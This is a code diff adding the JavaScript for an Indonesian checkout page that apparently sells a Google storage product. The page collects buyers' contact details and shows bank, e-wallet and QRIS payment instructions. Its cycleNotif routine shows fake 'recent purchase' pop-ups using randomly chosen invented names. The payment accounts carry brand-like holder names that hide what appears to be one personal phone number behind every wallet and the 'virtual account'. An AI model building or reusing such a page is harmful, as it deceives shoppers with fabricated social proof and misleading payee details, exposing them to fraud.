+                number: '00020101021126610016ID.CO.SHOPEE.WWW01189360091800223157700208223157700303UMI51440014ID.CO.QRIS.WWW0215ID10254270621910303UMI5204481453033605802ID5904Epay6013JAKARTA PUSAT61051061062070703A0163042F15',
+                logo: 'https://upload.wikimedia.org/wikipedia/commons/thumb/a/a2/Logo_QRIS.svg/163px-Logo_QRIS.svg.png',
+                desc: 'Scan pakai GoPay, OVO, Dana, BCA, dll'
+            },
+            bca: {
+                name: 'BCA Virtual Account',
+                holder: 'Epayment',
+                number: '39358089510639366',
+                logo: 'https://upload.wikimedia.org/wikipedia/commons/thumb/5/5c/Bank_Central_Asia.svg/330px-Bank_Central_Asia.svg.png',
+                desc: 'Cek otomatis'
+            },
+            cimb: {
+                name: 'CIMB Niaga / Octo',
+                holder: 'Octo Pay',
+                number: '6289510639366',
+                logo: 'https://upload.wikimedia.org/wikipedia/commons/thumb/3/38/CIMB_Niaga_logo.svg/330px-CIMB_Niaga_logo.svg.png',
+                desc: 'Transfer Bank Lain (Kode 022)'
+            },
+            gopay: {
+                name: 'GoPay',
+                holder: 'Gopay',
+                number: '089510639366',
+                logo: 'https://upload.wikimedia.org/wikipedia/commons/thumb/8/86/Gopay_logo.svg/320px-Gopay_logo.svg.png',
+                desc: 'Transfer ke sesama GoPay'
+            },
+            dana: {
+                name: 'DANA',
+                holder: 'DANA',
+                number: '089510639366',
+                logo: 'https://upload.wikimedia.org/wikipedia/commons/thumb/7/72/Logo_dana_blue.svg/330px-Logo_dana_blue.svg.png',
+                desc: 'Kirim ke nomor HP'
+            },
+            ovo: {
+                name: 'OVO',
+                holder: 'OVO',
+                number: '089510639366',
+                logo: 'https://upload.wikimedia.org/wikipedia/commons/thumb/e/eb/Logo_ovo_purple.svg/330px-Logo_ovo_purple.svg.png',
+                desc: 'Transfer sesama OVO'
+            }
+        };
+
+        const uniqueCode = Math.floor(Math.random() * (500 - 100 + 1)) + 100;
+        let currentProduct = 'google';
+        let currentImageIndex = 0;
+        let expiryTime;
+
+        // --- DOM ELEMENTS ---
+        const els = {
+            card: document.getElementById('product-card'),
+            summary: document.getElementById('order-summary'),
+            faq: document.getElementById('faq-container'),
+            testimonials: document.getElementById('testimonial-track'),
+            paymentGrid: document.getElementById('payment-methods-grid'),
+            year: document.getElementById('currentYear'),
+            notif: document.getElementById('notifBox'),
+            accordions: document.getElementById('product-details-accordions')
+        };
+
+        // --- RENDER FUNCTIONS ---
+        function formatMoney(amount) {
+            return 'Rp' + amount.toLocaleString('id-ID');
+        }
+
+        function renderProduct() {
+            const p = products[currentProduct];
+            const discount = Math.round(((p.normalPrice - p.price) / p.normalPrice) * 100);
+            
+            // Render Card
+            els.card.innerHTML = `
+                <div class="flex justify-between items-start mb-4">
+                    <div>
+                        <span class="bg-blue-100 text-blue-700 text-xs font-bold px-2 py-1 rounded-md uppercase tracking-wide">Best Value</span>
+                        <h2 class="text-2xl font-bold text-gray-900 mt-2">${p.title}</h2>
+                        <p class="text-sm text-gray-500">${p.tagline}</p>
+                    </div>
+                    <img src="${p.logo}" class="w-14 h-14 object-contain">
+                </div>
+                <div class="space-y-2 mb-6">
+                    ${p.features.map(f => `
+                        <div class="flex items-center gap-3 text-sm text-gray-700">
+                            <i class="fas fa-check-circle text-green-500 text-lg"></i>
+                            <span>${f}</span>
+                        </div>
+                    `).join('')}
+                </div>
+                <div class="flex items-end justify-between border-t border-gray-100 pt-4">
+                    <div>
+                        <p class="text-xs text-gray-400 line-through mb-0.5">${formatMoney(p.normalPrice)}</p>
+                        <p class="text-3xl font-bold text-blue-600 tracking-tight">${formatMoney(p.price)}</p>
+                    </div>
+                </div>
+            `;
+
+            // Render Accordions for Features and Policy
+            const colors = ['text-blue-500', 'text-green-500', 'text-yellow-500', 'text-red-500'];
+            const featuresHTML = `<ul class="space-y-3">${p.featuresList.map((f, index) => `<li class="flex items-start"><i class="fas fa-check-circle ${colors[index % colors.length]} mt-1 mr-3 text-lg feature-icon"></i><span class="text-gray-700 text-sm leading-relaxed">${f}</span></li>`).join('')}</ul>`;
+            
+            els.accordions.innerHTML = `
+                 <details class="details-accordion group bg-white rounded-xl border border-gray-200 overflow-hidden transition-all duration-300 open:bg-white open:shadow-sm">
+                    <summary class="flex justify-between items-center font-bold cursor-pointer list-none p-4 text-sm text-gray-800">
+                        <span>Detail Deskripsi</span>
+                        <span class="transition group-open:rotate-180">
+                            <i class="fas fa-chevron-down text-gray-400 text-xs"></i>
+                        </span>
+                    </summary>
+                    <div class="text-gray-600 text-sm p-4 pt-0 leading-relaxed border-t border-transparent group-open:border-gray-100">
+                        ${featuresHTML}
+                    </div>
+                </details>
+                <details class="details-accordion group bg-white rounded-xl border border-gray-200 overflow-hidden transition-all duration-300 open:bg-white open:shadow-sm">
+                    <summary class="flex justify-between items-center font-bold cursor-pointer list-none p-4 text-sm text-gray-800">
+                        <span>Informasi Penting</span>
+                        <span class="transition group-open:rotate-180">
+                            <i class="fas fa-chevron-down text-gray-400 text-xs"></i>
+                        </span>
+                    </summary>
+                    <div class="text-gray-600 text-sm p-4 pt-0 leading-relaxed border-t border-transparent group-open:border-gray-100">
+                        ${p.policyHTML}
+                    </div>
+                </details>
+            `;
+
+            // Render Testimonials
+            // Using a larger set for smoother scroll
+            const allImages = [...p.testimonials, ...p.testimonials, ...p.testimonials]; 
+            els.testimonials.innerHTML = allImages.map((img, i) => `
+                <div class="flex-shrink-0 w-32 h-24 rounded-xl overflow-hidden cursor-pointer hover:opacity-80 transition-opacity" onclick="openImageModal(${i % p.testimonials.length})">
+                    <img src="${img}" class="w-full h-full object-cover" onerror="this.src='https://placehold.co/150x150?text=Testimoni'">
+                </div>
+            `).join('');
+
+            // Render FAQ
+            els.faq.innerHTML = p.faq.map(item => `
+                <details class="group bg-gray-50 rounded-xl border border-gray-200 overflow-hidden transition-all duration-300 open:bg-white open:shadow-sm">
+                    <summary class="flex justify-between items-center font-medium cursor-pointer list-none p-4 text-sm text-gray-800">
+                        <span>${item.q}</span>
+                        <span class="transition group-open:rotate-180">
+                            <i class="fas fa-chevron-down text-gray-400 text-xs"></i>
+                        </span>
+                    </summary>
+                    <div class="text-gray-600 text-sm p-4 pt-0 leading-relaxed border-t border-transparent group-open:border-gray-100">
+                        ${item.a}
+                    </div>
+                </details>
+            `).join('');
+
+            updateSummary();
+        }
+
+        function renderPaymentMethods() {
+            els.paymentGrid.innerHTML = Object.entries(paymentAccounts).map(([key, acc], idx) => `
+                <label class="relative cursor-pointer group">
+                    <input type="radio" name="payment-method" value="${key}" class="payment-radio peer hidden" ${idx===0 ? 'checked' : ''} onchange="updateSummary()">
+                    <div class="p-3 rounded-xl border border-gray-200 bg-white hover:border-blue-300 transition-all h-full flex flex-col justify-between items-center text-center gap-2 relative overflow-hidden">
+                        <div class="absolute top-2 right-2 w-5 h-5 bg-blue-500 rounded-full flex items-center justify-center opacity-0 transform scale-50 transition-all duration-200 check-icon">
+                            <i class="fas fa-check text-white text-xs"></i>
+                        </div>
+                        <img src="${acc.logo}" class="h-6 object-contain grayscale group-hover:grayscale-0 peer-checked:grayscale-0 transition-all">
+                        <span class="text-xs font-medium text-gray-600">${acc.name}</span>
+                    </div>
+                </label>
+            `).join('');
+        }
+
+        function updateSummary() {
+            const p = products[currentProduct];
+            const total = p.price + uniqueCode;
+            const pm = document.querySelector('input[name="payment-method"]:checked')?.value || 'qris';
+            
+            els.summary.innerHTML = `
+                <div class="flex justify-between text-sm mb-2 text-gray-600">
+                    <span>Harga Paket</span>
+                    <span>${formatMoney(p.price)}</span>
+                </div>
+                <div class="flex justify-between text-sm mb-4 text-gray-600">
+                    <span>Kode Unik</span>
+                    <span>${formatMoney(uniqueCode)}</span>
+                </div>
+                <div class="flex justify-between items-center pt-3 border-t border-gray-200">
+                    <span class="font-bold text-gray-900">Total Tagihan</span>
+                    <span class="text-xl font-bold text-blue-600">${formatMoney(total)}</span>
+                </div>
+            `;
+        }
+
+        // --- LOGIC FUNCTIONS ---
+        function validatePhone(phone) {
+            const clean = phone.replace(/\D/g, '');
+            if (clean.length < 10 || clean.length > 14) return false;
+            if (!clean.startsWith('08') && !clean.startsWith('628')) return false;
+            return true;
+        }
+
+        async function handleFormSubmit() {
+            const btn = document.getElementById('submit-btn');
+            const form = document.getElementById('orderForm');
+            const formData = new FormData(form);
+            
+            // Validation
+            const name = formData.get('nama');
+            const wa = formData.get('whatsapp');
+            const email = formData.get('email');
+            
+            if (!name || !wa || !email) return showAlert("Data Belum Lengkap", "Mohon isi semua data diri Anda.");
+            if (!validatePhone(wa)) return showAlert("Nomor Salah", "Masukkan nomor WhatsApp yang valid (awalan 08..).");
+            if (!email.includes('@') || !email.includes('.')) return showAlert("Email Salah", "Masukkan alamat email yang valid.");
+
+            // Submit Process
+            btn.disabled = true;
+            btn.innerHTML = `<div class="spinner mr-2"></div> Memproses...`;
+
+            const p = products[currentProduct];
+            const total = p.price + uniqueCode;
+            const pmKey = document.querySelector('input[name="payment-method"]:checked').value;
+            const pm = paymentAccounts[pmKey];
+            const paymentId = `INV-${p.id.toUpperCase()}-${Date.now().toString().slice(-6)}`;
+
+            const data = {
+                nama: name,
+                whatsapp: wa,
+                email: email,
+                paket: p.name,
+                metodePembayaran: pm.name,
+                totalTransfer: formatMoney(total),
+                idPembayaran: paymentId,
+                nomorRekening: pm.number,
+                sheetName: 'upstorage'
+            };
+
+            try {
+                await fetch('https://script.google.com/macros/s/AKfycbySaAB2WT0D59UlLyZcXliWvNURCnHcRrqz5P8C2LCQbVdk0hn3Qkl1glGiLJSql_Wh/exec', {
+                    method: 'POST',
+                    mode: 'no-cors',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(data)
+                });
+                
+                showPaymentOverlay(data, p, total, pm, paymentId, pmKey);
+            } catch (e) {
+                showAlert("Error", "Gagal mengirim data. Coba lagi nanti.");
+                btn.disabled = false;
+                btn.innerHTML = `<span>Beli Sekarang</span><i class="fas fa-arrow-right text-sm"></i>`;
+            }
+        }
+
+        function getInstructions(key, number) {
+            const instructions = {
+                qris: `
+                    <div class="space-y-2">
+                        <p>1. Buka aplikasi pembayaran Anda (GoPay, OVO, Dana, BCA Mobile, dll).</p>
+                        <p>2. Scan QRIS di atas.</p>
+                        <p>3. Pastikan nominal pembayaran sesuai.</p>
+                        <p>4. Masukkan PIN Anda.</p>
+                        <p>5. Simpan bukti pembayaran.</p>
+                    </div>`,
+                bca: `
+                    <details class="group"><summary class="font-medium cursor-pointer py-1">myBCA</summary><div class="text-sm text-gray-600 pl-4 py-1">1. Transfer > Virtual Account<br>2. Masukkan ${number}<br>3. Konfirmasi & Bayar</div></details>
+                    <details class="group"><summary class="font-medium cursor-pointer py-1">BCA Mobile</summary><div class="text-sm text-gray-600 pl-4 py-1">1. m-Transfer > BCA Virtual Account<br>2. Masukkan ${number}<br>3. Konfirmasi & Bayar</div></details>
+                    <details class="group"><summary class="font-medium cursor-pointer py-1">ATM BCA</summary><div class="text-sm text-gray-600 pl-4 py-1">1. Transaksi Lain > Transfer > BCA VA<br>2. Masukkan ${number}<br>3. Bayar sesuai nominal</div></details>`,
+                cimb: `
+                    <details class="group"><summary class="font-medium cursor-pointer py-1">OCTO Mobile</summary><div class="text-sm text-gray-600 pl-4 py-1">1. Transfer > Rekening CIMB Niaga<br>2. Masukkan ${number}<br>3. Konfirmasi & Bayar</div></details>
+                    <details class="group"><summary class="font-medium cursor-pointer py-1">Bank Lain</summary><div class="text-sm text-gray-600 pl-4 py-1">1. Transfer ke Bank CIMB Niaga (022)<br>2. Masukkan ${number}<br>3. Masukkan nominal & kirim</div></details>`,
+                gopay: `
+                    <p>1. Buka aplikasi Gojek.</p>
+                    <p>2. Pilih Bayar > Kirim ke sesama GoPay.</p>
+                    <p>3. Masukkan nomor ${number}.</p>
+                    <p>4. Masukkan nominal & konfirmasi.</p>`,
+                dana: `
+                    <p>1. Buka aplikasi DANA.</p>
+                    <p>2. Kirim > Kirim ke Nomor HP.</p>
+                    <p>3. Masukkan nomor ${number}.</p>
+                    <p>4. Masukkan nominal & konfirmasi.</p>`,
+                ovo: `
+                    <p>1. Buka aplikasi OVO.</p>
+                    <p>2. Transfer > Sesama OVO.</p>
+                    <p>3. Masukkan nomor ${number}.</p>
+                    <p>4. Masukkan nominal & konfirmasi.</p>`
+            };
+            return instructions[key] || `<p>Silakan transfer ke nomor tertera sesuai nominal.</p>`;
+        }
+
+        function showPaymentOverlay(data, product, total, account, invId, pmKey) {
+            // Setup details
+            const overlay = document.getElementById('payment-overlay');
+            document.getElementById('payment-total').innerText = formatMoney(total);
+            document.getElementById('payment-logo-container').innerHTML = `<img src="${account.logo}" class="h-full object-contain">`;
+            
+            // Countdown
+            expiryTime = new Date().getTime() + 24 * 60 * 60 * 1000;
+            startTimer();
+
+            // Content based on type
+            const contentDiv = document.getElementById('payment-details-content');
+            if (account.name === 'QRIS') {
+                contentDiv.innerHTML = `
+                    <div id="qrcode-canvas" class="flex justify-center my-4"></div>
+                    <p class="text-sm text-gray-500 mb-4">Scan QRIS ini dengan GoPay/OVO/Dana/Mobile Banking</p>
+                    <button onclick="downloadQR()" class="text-blue-600 text-sm font-medium hover:underline"><i class="fas fa-download"></i> Simpan Gambar QRIS</button>
+                `;
+                setTimeout(() => {
+                     // Dynamic QRIS Logic (Fixed: Using QRCode.toCanvas)
+                    try {
+                        const qrisStatic = account.number;
+                        const finalQris = createDynamicQris(qrisStatic, total);
+                        document.getElementById('qrcode-canvas').innerHTML = '';
+                        const canvas = document.createElement('canvas');
+                        QRCode.toCanvas(canvas, finalQris, { width: 220, margin: 1 }, function (error) {
+                            if (error) console.error(error)
+                        });
+                        canvas.style.borderRadius = "8px";
+                        document.getElementById('qrcode-canvas').appendChild(canvas);
+                    } catch(e) { console.error(e); }
+                }, 100);
+            } else {
+                contentDiv.innerHTML = `
+                    <p class="text-gray-500 text-xs mb-1 uppercase tracking-wider">Nomor Rekening / VA</p>
+                    <p class="text-2xl font-bold text-gray-900 tracking-wide font-mono select-all bg-gray-50 py-2 rounded-lg cursor-pointer" onclick="copyText('${account.number}')">${account.number}</p>
+                    <p class="text-sm text-gray-500 mt-2">a.n ${account.holder}</p>
+                    <button onclick="copyText('${account.number}')" class="mt-4 px-4 py-2 bg-gray-100 text-gray-700 rounded-lg text-sm font-medium hover:bg-gray-200 transition">Salin Nomor</button>
+                `;
+            }
+
+            // WA Link
+            const waMsg = `Halo, saya sudah transfer untuk invoice *${invId}*.\nNominal: *${formatMoney(total)}*\nAtas nama: *${data.nama}*`;
+            document.getElementById('wa-confirm-btn').href = `https://wa.me/6285602152097?text=${encodeURIComponent(waMsg)}`;
+
+            // Instructions (Restored Logic)
+            document.getElementById('payment-instructions-list').innerHTML = `
+                <div class="text-sm text-gray-600 space-y-2">
+                    ${getInstructions(pmKey, account.number)}
+                    <div class="mt-4 pt-4 border-t border-gray-100 text-xs text-gray-500">
+                        <p class="mb-1"><i class="fas fa-exclamation-circle text-orange-500"></i> Penting:</p>
+                        <ul class="list-disc pl-4 space-y-1">
+                            <li>Transfer harus sesuai nominal hingga 3 digit terakhir.</li>
+                            <li>Simpan bukti transfer Anda.</li>
+                            <li>Konfirmasi ke WhatsApp admin setelah transfer.</li>
+                        </ul>
+                    </div>
+                </div>
+            `;
+
+            overlay.classList.remove('hidden');
+        }
+
+        // --- UTILS ---
+        function createDynamicQris(qris, nominal) {
+            // Simple CRC16 & modification logic as per original
+            let qrisModified = qris.slice(0, -4).replace("010211", "010212");
+            const nominalStr = String(Math.round(nominal));
+            const amountLength = nominalStr.length < 10 ? "0" + nominalStr.length : nominalStr.length.toString();
+            const amountPart = "54" + amountLength + nominalStr;
+            let finalQris = qrisModified.replace("5802ID", amountPart + "5802ID");
+            
+            let crc = 0xFFFF;
+            for (let i = 0; i < finalQris.length; i++) {
+                crc ^= finalQris.charCodeAt(i) << 8;
+                for (let j = 0; j < 8; j++) {
+                    crc = crc & 0x8000 ? (crc << 1) ^ 0x1021 : crc << 1;
+                }
+            }
+            const crcHex = (crc & 0xFFFF).toString(16).toUpperCase().padStart(4, '0');
+            return finalQris + crcHex;
+        }
+
+        function startTimer() {
+            setInterval(() => {
+                const now = new Date().getTime();
+                const dist = expiryTime - now;
+                if(dist < 0) return;
+                const h = Math.floor((dist % (86400000)) / (3600000));
+                const m = Math.floor((dist % (3600000)) / 60000);
+                const s = Math.floor((dist % 60000) / 1000);
+                document.getElementById('countdown-timer').innerText = `Sisa Waktu: ${h}:${m}:${s}`;
+            }, 1000);
+        }
+
+        // --- UI HANDLERS ---
+        document.querySelectorAll('input[name="product"]').forEach(r => {
+            r.addEventListener('change', (e) => {
+                currentProduct = e.target.value;
+                renderProduct();
+            });
+        });
+
+        // Notifications
+        const FIRST_NAMES = ["Budi Santoso", "Ayu", "Rahmat", "Citra Dewi Kusuma", "Bayu Pratama", "Lina", "Wulan", "Adi", "Farhan Syahputra", "Hendra Wijaya", "Nana Puspita Dewi", "Joko", "Mega Sari", "Gilang Pramana Putra", "Sari", "Dedi", "Eka Suryani", "Teguh", "Putri Lestari Ayu", "Andi", "Bagus Wijaya", "Ilham Saputra Nugraha", "Rizal", "Mira Astuti", "Puspita", "Hari", "Tri Saputra", "Cahya Pratama", "Surya Darmawan Putra", "Wahyu Ramadhan", "Agus", "Indra Permana", "Linda", "Fajar Mahendra Saputra", "Yusuf", "Pramono Adi Nugroho", "Sinta Dewi", "Bima Pratama", "Dian", "Hasan Basri", "Nurul Aini", "Arif Budiman", "Feri", "Lukman Hakim", "Rangga", "Rini Anggraini Putri", "Tono", "Hadi Prasetyo", "Elisa Purnama", "Anisa Rahma", "Gunawan", "Melati", "Bagus Prasetyo Ramadhan", "Septi Amelia", "Cindy Amelia", "Windi Saputri", "Galih Pratama", "Evi", "Putra", "Slamet Riyadi", "Latif Hidayat", "Gita Puspita", "Darmawan", "Maya", "Erik Saputra Pratama", "Jani", "Jefri Maulana", "Bella Sari", "Maulana", "Novi Andriana Lestari", "Fajar Nugroho", "Taufik Hidayat", "Prasetyo", "Samsul", "Agung", "Endang", "Indah", "Hana Pertiwi", "Mirna", "Yulia", "Panca", "Niken", "Rio", "Adi Putra Ramadhan", "Ganda", "Wahida", "Robby Saputra", "Halim", "Firman Saputra", "Berlian Putra", "Ari", "Joko Setiawan", "Mustika", "Bahar", "Mega", "Erlangga", "Sofyan", "Doni", "Fatimah", "Dian Purnama Sari", "Rama", "Imam Saputra", "Johan", "Gusman", "Lintang", "Nabila", "Beni", "Purnama", "Murni", "Malik", "Nurlan", "Doni Saputra", "Lastri", "Berlinda", "Rasyid", "Tari", "Nia", "Tirta", "Juli Andriani", "Lutfi", "Suci", "Arman", "Yani", "Citra Ayu", "Harto", "Rangga Pratama", "Febrina", "Indra Gunawan Saputra", "Tomi", "Sutrisno", "Risma", "Jihan Ayu Pratiwi", "Lestari", "Dewi Kusuma", "Fahmi", "Rifki", "Wira", "Putra Wijaya", "Beni Setiawan", "Asep", "Gerry", "Prasetia", "Euis", "Latif", "Pajar", "Rahmat Hidayat", "Rudi", "Tika", "Danu", "Hesti", "Syahrul", "Anwar", "Miranti", "Nuraini", "Nurman", "Eman Kurnia", "Nirmala", "Hari Susanto", "Taufan", "Tono Prabowo", "Bayu Saputra Nugroho", "Darma", "Nurlaila", "Hafid", "Mustofa", "Elok", "Gunarto", "Novi", "Lasman", "Jamaludin", "Andi Wijaya Putra", "Herman", "Mila", "Wibowo", "Prayitno", "Adi Saputra", "Jamal", "Irfan", "Iskandar", "Yudha", "Lutris", "Samsul Hidayat", "Heru", "Bagus", "Rudianto", "Nanda Putri", "Laila Rahma", "Frans", "Hilda", "Cahya", "Rudi Pratama", "Setiawan", "Rangga Saputra", "Puspa", "Doni Prasetyo", "Nurul", "Febri", "Mega Sari Lestari", "Suyatno", "Tomiadi", "Fikri", "Lani", "Intan", "Johan Saputra", "Iwan", "Berliano", "Ilham", "Teddy", "Lani Puspita", "Eka Putri Andayani", "Hani", "Adi Wijaya", "Adit", "Dicky", "Gopal", "Pramono", "Gunadi", "Gilang", "Joko Prayitno Adi", "Mira", "Puspita Sari", "Maulana Hakim", "Putri Ayu Lestari", "Malik Prasetyo", "Toriq", "Joni", "Gilang Pratama", "Bagus Wijaya Putra", "Berlian", "Wandi", "Nurman Saputra", "Fajarudin", "Lutfi Pratama", "Citra", "Nanda", "Laras", "Tuti", "Yani Pratiwi", "Gusman Saputra", "Rangga Putra", "Prasetiawan", "Ismail", "Heri", "Adi Nugroho", "Putri", "Prasetyo Adi", "Dona", "Gani", "Jihan", "Puspita Dewi", "Rizal Maulana", "Mahendra", "Ayu Pratiwi", "Rangga Setiawan", "Lina Sari", "Fani", "Adi Wijaya Putra", "Sari Melati", "Andri", "Bima", "Teguh Santoso Adi", "Fajar", "Wulan Dewi", "Rama Pratama", "Nana", "Farhan", "Dion", "Melati Pertiwi", "Adi Putra", "Joko Santoso", "Doni Setiawan", "Lintang Pertiwi", "Septi", "Gopal Pramana", "Tomi Pratama", "Rio Nugraha", "Cindy", "Hafid Saputra", "Hendra", "Niken Lestari", "Rangga Nugroho", "Putri Ayu", "Sofyan Hidayat", "Robby", "Bima Saputra", "Indra", "Adi Kurniawan", "Nanda Saputra", "Gilang Saputra", "Wahyu", "Puspita Ayu", "Rudi Hartono", "Wulan Dewi Pertiwi", "Ayu Pratiwi Lestari", "Tono Adi", "Dedi Kurniawan", "Prasetyo Ramadhan", "Adi Setiawan", "Mira Lestari", "Farhan Syahputra Adi", "Nurul Hidayah", "Sari Anggraini", "Bayu", "Eman", "Putra Adi Nugroho", "Lestari Ayu", "Bambang", "Rangga Hidayat", "Mega Putri", "Adi Nugraha", "Anisa", "Siska", "Wandi Putra", "Fajar Saputra", "Gunawan Pratama", "Heri Setiawan", "Arif", "Ilham Nugroho", "Bagus Pratama", "Erlangga Putra", "Rian", "Pandu", "Tari Ayu", "Hendro", "Risma Ayu", "Adi Pratama", "Septi Ayu", "Bambang Santoso", "Lukman", "Gani Saputra", "Hasan", "Feri Kurniawan", "Tirta", "Bambang Prasetyo", "Pajar Saputra", "Arman Putra", "Murni Ayu", "Hafiz", "Euis Sari", "Bayu Nugroho", "Tomi Saputra", "Gerry Pratama", "Arif Prasetyo", "Johan Putra", "Hafid Nugraha", "Nabila Pertiwi", "Latif Saputra", "Ari Saputra", "Rio Saputra", "Tono Saputra", "Wandi Saputra", "Mahendra Putra", "Ilham Pratama", "Putri Dewi", "Adi Lestari", "Rangga Maulana", "Bayu Hidayat", "Fani Puspita", "Taufik", "Bagus Saputra", "Novi Puspita", "Rahmat Hidayatullah Putra", "Prayitno Saputra", "Adi Ramadhan", "Bayu Wijaya", "Gilang Nugraha", "Rangga Prasetyo", "Putra Purnama", "Wulan Pertiwi", "Adi Wijaya Ramadhan", "Budi", "Rian Pratama", "Samsul Nugroho", "Wahyu Saputra", "Teguh Prasetyo", "Fikri Nugraha", "Rizki Pratama"];
+
+        function cycleNotif() {
+            const el = els.notif;
+            const nameEl = el.querySelector('.notif-name');
+            
+            setTimeout(() => {
+                const randomName = FIRST_NAMES[Math.floor(Math.random() * FIRST_NAMES.length)];
+                nameEl.innerText = randomName;
+                el.classList.remove('-translate-y-24'); // Show
+                setTimeout(() => {
+                    el.classList.add('-translate-y-24'); // Hide
+                    cycleNotif(); // Recurse
+                }, 4000);
+            }, Math.random() * 5000 + 5000);
+        }
+
+        // Modals
+        function showAlert(title, msg) {
+            document.getElementById('alertTitle').innerText = title;
+            document.getElementById('alertMessage').innerText = msg;
+            document.getElementById('alertModal').classList.add('active');
+        }
+        function closeAlertModal() {
+            document.getElementById('alertModal').classList.remove('active');
+        }
+
+        // Image Modal
+        function openImageModal(idx) {
+            const p = products[currentProduct];
+            currentImageIndex = idx;
+            document.getElementById('modalImage').src = p.testimonials[idx];
+            document.getElementById('imageModal').classList.add('active');
+        }
+        function closeImageModal() {
+            document.getElementById('imageModal').classList.remove('active');
+        }
+        function nextImage() {
+            const p = products[currentProduct];
+            currentImageIndex = (currentImageIndex + 1) % p.testimonials.length;
+            document.getElementById('modalImage').src = p.testimonials[currentImageIndex];
+        }
+        function prevImage() {
+            const p = products[currentProduct];
+            currentImageIndex = (currentImageIndex - 1 + p.testimonials.length) % p.testimonials.length;
+            document.getElementById('modalImage').src = p.testimonials[currentImageIndex];
+        }
+        
+        // Copy Utils
+        function copyAmount() {
+            const p = products[currentProduct];
+            copyText(p.price + uniqueCode);
+        }
+        function copyText(text) {
+            navigator.clipboard.writeText(text);
+            showAlert("Berhasil Disalin", text + " telah disalin.");
+        }
+        function downloadQR() {
+            const canvas = document.querySelector('#qrcode-canvas canvas');
+            const a = document.createElement('a');
+            a.href = canvas.toDataURL();
+            a.download = 'QRIS-Pembayaran.png';
+            a.click();
+        }
+
+        // Init
+        els.year.innerText = new Date().getFullYear();
+        renderProduct();
+        renderPaymentMethods();
+        cycleNotif();
+
+    </script>
+</body>
+</html>
